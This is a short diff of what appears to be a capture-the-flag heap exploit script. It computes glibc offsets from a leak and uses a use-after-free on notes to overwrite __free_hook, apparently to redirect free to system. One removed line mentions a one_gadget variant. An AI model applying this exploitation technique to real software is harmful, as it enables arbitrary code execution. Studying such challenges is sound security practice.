@@ -99,7 +99,6 @@ def show_note(idx):
 ofs_av_top      = 0x3b5be0
 ofs_malloc_hook = 0x3b5b70
 ofs_free_hook   = 0x3b7e48
-#ofs_onegadget   = 0x0c571f 
 ofs_system      = 0x0430a0
 
 banner = 'test'
@@ -133,13 +132,11 @@ libc_base   = leak - ofs_av_top
 malloc_hook = libc_base + ofs_malloc_hook 
 free_hook   = libc_base + ofs_free_hook
 addr_system = libc_base + ofs_system
-#one_gadget  = libc_base + ofs_onegadget
 dbg("libc_base")
 dbg("malloc_hook")
 dbg("free_hook")
 dbg("addr_system")
 
-## UAF-> AAW primitive malloc_hook->one_gadget
 delete_note(C)
 delete_note(X)
 edit_note(X, pQ(free_hook))
